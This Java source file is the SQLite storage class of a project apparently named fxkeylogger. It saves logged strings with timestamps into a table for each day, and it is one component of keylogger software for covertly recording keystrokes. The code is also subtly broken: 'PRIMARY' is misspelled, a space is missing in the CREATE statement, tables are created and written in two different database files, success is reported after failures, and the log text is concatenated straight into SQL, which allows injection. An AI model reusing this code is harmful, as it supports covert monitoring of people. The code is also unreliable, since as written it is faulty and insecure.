package ch.fxlogger.fxkeylogger;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;

import org.sqlite.JDBC;

import java.sql.*;

public class SQLDatabaseConnection {

    private String nameOfTableFromToday = getNameOfTableFromToday();

    private String getNameOfTableFromToday() {
        Calendar calendar = Calendar.getInstance();
        int dayToday = calendar.get(Calendar.DAY_OF_MONTH);
        int monthToday = calendar.get(Calendar.MONTH);
        int yearToday = calendar.get(Calendar.YEAR);

        String ret = "LogTable[" + dayToday + "_" + monthToday + "_" + yearToday + "]";
        return ret;
    }


    public void connect() {
        Connection conn = null;
        try {
            Class.forName("org.sqlite.JDBC");
            conn = DriverManager.getConnection("jdbc:sqlite:keyloggerDB.db");
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        System.out.println("Connection Successfully");
    }

    public void createTable() {
        try {
            Statement stmt = null;
            Connection conn = null;
            conn = DriverManager.getConnection("jdbc:sqlite:keyloggerDB.db");
            System.out.println("Connection Successfully");
            stmt = conn.createStatement();

            String sql = "CREATE TABLE IF NOT EXISTS" + nameOfTableFromToday +
                    "(IC INTEGER PRINAMY KEY AUTOINCREMENT, " +
                    "LOG TEXT NOT NULL," +
                    "TIME TEXT NOT NULL)";
            stmt.executeUpdate(sql);
            System.out.println("Table successfully created");
            stmt.close();
            conn.close();
        } catch (Exception e) {
            System.out.println("Error while creating Table of todays Date");
            System.out.println(e.getMessage());
        }
    }

    public void writeIntoDatabase(String log) {
        Connection conn = null;
        Statement stmt = null;

        try {
            conn = DriverManager.getConnection("jdbc:sqlite:keylogger.db");
            conn.setAutoCommit(false);
            stmt = conn.createStatement();
            System.out.println("Successfully connected will try to write now");
            String sql = "INSERT INTO " + nameOfTableFromToday + "(LOG, TIME) "
                    + "VALUES ('" + log + "', '" + getTime() + "');";
            stmt.executeUpdate(sql);
            stmt.close();
            conn.commit();
            conn.close();
            System.out.println("Log successfully added to keylogger.db");
        } catch (Exception e) {
            System.err.println("Log could not be added to the database");
            System.err.println(e.toString());
        }
    }

    private String getTime() {
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("HH:mm:ss");
        LocalDateTime now = LocalDateTime.now();
        return dtf.format(now);
    }

}
